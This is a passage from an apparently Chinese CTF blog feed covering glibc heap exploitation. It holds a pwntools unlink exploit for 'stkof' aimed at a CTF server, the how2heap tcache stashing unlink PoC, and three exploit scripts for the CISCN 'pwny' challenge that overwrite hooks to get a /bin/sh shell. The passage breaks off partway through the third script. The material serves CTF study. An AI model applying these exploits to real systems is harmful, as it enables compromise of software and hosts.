<p>先通过unlink把堆结构上的堆指针改为在堆结构前的地址，从而可以控制堆结构，达成任意写；然后先修改 <code>s[1] = free@got</code> 地址，同时修改 <code>s[2] = puts@got</code> 地址；再一次编辑，实现覆写free@got为puts@plt,从而当调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。然后free(s[2])，相当于执行了puts（puts@got）通过puts泄露puts@got的值，获得libc基地址，然后就可以获得system；最后修改再把free@got修改为system，对着写有/bin/sh\x00的堆块释放</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png"><span class="image-caption">image-20210831213326412</span></p>
<p>首先，这边第一个申请的chunk是不能被使用的，由于程序本身没有进行 setvbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，所以我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。具体的看ctfwiki这题的<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO 缓冲区问题分析</a>。所以第一个堆块不能用来做fakechunk</p>
<p>所以这边进行创造fake_chunk要注意！首先，堆块的索引从1开始；其次第一个不能用，所以我们要从堆结构的第二个地方作为地址</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png"><span class="image-caption">image-20210831214046823</span></p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png"><span class="image-caption">image-20210831214232302</span></p>
<p>触发unlink，造成合并，同时堆结构指针的值被改为其地址 - 0x18</p>
<p>然后就是按照思路所说的，去修改堆结构即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 防止合并</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size  size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="新版本下的unlink"><a href="#新版本下的unlink" class="headerlink" title="新版本下的unlink"></a>新版本下的unlink</h2><p>在 glibc2.29 以上版本，glibc 在 unlink 内加入了 prevsize check。当然这个检测对于上面的unlink攻击是没有影响的，影响的是offbynull的攻击利用，不能直接通过修改size来制造堆块重叠。下面是新的检测机制源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>具体关于offbynull带来的影响，可以移步我的另一篇博客offbyone&amp;null</p>
<h2 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h2><p>这是一个类unlink的攻击手法，利用版本从 glibc-2.27一直到最新的 glibc-2.34 仍然可以利用。</p>
<p>关键源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<br>_int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes) &#123;<br>...<br>	<span class="hljs-keyword">if</span> (in_smallbin_range (nb)) &#123;<br>	...<br>	    <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) &#123;<br>	    ...<br>	    	 <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">             stash them in the tcache.  */</span><br>          <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>          <span class="hljs-comment">//①: 如果tchace不满</span><br>          <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123;<br>              mchunkptr tc_victim;<br>              <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>              <span class="hljs-comment">//②: tcache不满且smallbin还有剩，则进入循环</span><br>              <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                     &amp;&amp; (tc_victim = last (bin)) != bin) &#123;<br>                  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>) &#123;<br>                  <span class="hljs-comment">//③: bk是攻击者控制的，故bck是目标地址附近的内存。这里没有double link check</span><br>                      bck = tc_victim-&gt;bk;<br>                      set_inuse_bit_at_offset (tc_victim, nb);<br>                      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (tc_victim);<br>                      bin-&gt;bk = bck;<br>                      <span class="hljs-comment">//④: 一个目标地址的写操作</span><br>                      bck-&gt;fd = bin;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br>	    &#125;<br>	&#125;<br>...<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>上面的源码过程总结为：</p>
<p>设需求的size为nb个字节；如果nb大小的tcache不满( 小于7 )，并且有2个以上nb大小的freed chunk 在smallbin中；在_int_malloc(av, nb)过程中，<code>会尝试把剩下的nb大小的smallbin放到tcache中</code>。</p>
<p>可以通过下面的how2heap的poc进行深入的gdb调试学习</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *target;<br><br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">// stack_var emulate the fake_chunk we want to alloc to</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);<br><br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">//now we malloc 9 chunks</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//put 7 chunks into tcache</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);<br><br>    <span class="hljs-comment">//last tcache bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//now they are put into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">//convert into small bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">// size &gt; 0x90</span><br><br>    <span class="hljs-comment">//now 5 tcache bins</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var);<br><br>    <span class="hljs-comment">//change victim-&gt;bck</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)stack_var;<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br><br>    <span class="hljs-comment">//trigger the attack</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">2</span>],(<span class="hljs-keyword">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br><br>    <span class="hljs-comment">//malloc and return our fake chunk on stack</span><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);   <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)target);<br><br>    <span class="hljs-built_in">assert</span>(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p>
<p>2.<code>tcache</code>中大小为size块的个数为6</p>
<p>3.申请堆块是<code>calloc</code></p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>释放6个0x100的chunk到tcache bin中</li>
<li>构造两个0x100的small bin（利用Unsorted bin或Large bin切割得到）</li>
<li>修改后插入的small bin的 bk 指针为目标地址-0x10，且保持fd指针不变</li>
<li>用calloc分配0x100的chunk</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>在目标地址上写入原本small bin上的 bk 指针内容</li>
</ul>
]]></content>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn</title>
    <url>/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/</url>
    <content><![CDATA[<h3 id="一、pwny"><a href="#一、pwny" class="headerlink" title="一、pwny"></a>一、pwny</h3><p>先checksec一下</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/4.png"></p>
<p>保护全开了，进入ida看看代码。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523174951.png"></p>
<p>三个功能，主要看read和write两个，其次注意在循环的顶上有个函数。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175036.png"></p>
<p>这里面，有一个定义的变量，存放了随机数的文字描述符。这里的变量作为后面两个功能里面的read的第一个参数，所以我们是无法输入数据的。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523175133.png"></p>
<p>进入write函数，这里数组存在越界，可以通过这里修改两次，把之前那个变量修改为0。这里是这么理解的：第一次修改，是把随机数里面的一个数据替换文字描述符，然后在来一次，由于这个随机数不会对应一个打开的文件，所以read不执行，v2仍然是0，就成功修改了。因为这题开启了PIE加上本就有的ASLR，我们要泄露的地址有两个，一个是PIE，另一个是libc</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181332.png"></p>
<p>在read功能里面有个__print_chk，在汇编代码可以看见，第三个参数是可以被栈顶的内容影响，而这是我们可以输入的，所以继续数组越界</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181504.png"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181627.png"></p>
<p>分别泄露出.bss段上的stdrr,以及data里面存在一个该地址的偏移，可以看出来方向是对了，主题人给的条件。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/1.png"></p>
<p>这是计算泄露出的地址距离libc_base的偏移</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/3.png"></p>
<p>最后劫持exit_hook为system，并且找到exit对应的参数位置，将其修改为”/bin/sh\x00”。大佬的思维是真滴强！膜拜！</p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc =ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.send(p64(idx))<br>write_s(<span class="hljs-number">0x100</span>)<br>write_s(<span class="hljs-number">0x100</span>)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x3ec680</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.address)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFF5</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)+<span class="hljs-number">0x58</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(pie)<br>write_s((libc.address+<span class="hljs-number">0x61b968</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>gdb.attach(p)<br>write_s((libc.address+<span class="hljs-number">0x61bf60</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二种做法涉及到一个知识点，scanf函数在遇到过长输入时会申请堆。前面在泄漏PIE和libc是一致的，getshell时，让数组越界访问到__malloc_hook那边去，写入one_gadget</p>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))  <span class="hljs-comment"># bss --&gt; stderr</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))  <span class="hljs-comment"># data --&gt; off_202008</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(base)<br>m_hook = base+libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;m_hook: &quot;</span>, <span class="hljs-built_in">hex</span>(m_hook)<br>realloc = base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc)<br>oneshot = [<span class="hljs-number">0x4f3d5</span>, <span class="hljs-number">0x4f432</span>, <span class="hljs-number">0x10a41c</span>]<br>oneshot = base+oneshot[<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;oneshot: &quot;</span>, <span class="hljs-built_in">hex</span>(oneshot)<br><br>offset = (m_hook-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span><br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;offset: &quot;</span>, offset<br>write_con(<span class="hljs-built_in">int</span>(offset), p64(realloc+<span class="hljs-number">9</span>))<br>gdb.attach(p)<br>write_con(<span class="hljs-built_in">int</span>(offset-<span class="hljs-number">1</span>), p64(oneshot))<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">0x400</span>)   <span class="hljs-comment"># scanf</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>第三种在栈上进行跳转，这里就不修改和解释了，一个大佬直接复制过来的，就纯粹记录知识点：libc中environ存储了栈上环境变量</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ld_path = <span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/ld-2.27.so&quot;</span><br><span class="hljs-comment"># libc_path = &quot;/home/fanxinli/ctf_go/pwn/ciscn/pwny/libc-2.27.so&quot;</span><br><span class="hljs-comment">#   p = remote(&quot;124.71.230.113&quot;, 24425)</span><br>p = process([ld_path, <span class="hljs-string">&quot;./pwny&quot;</span>])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: 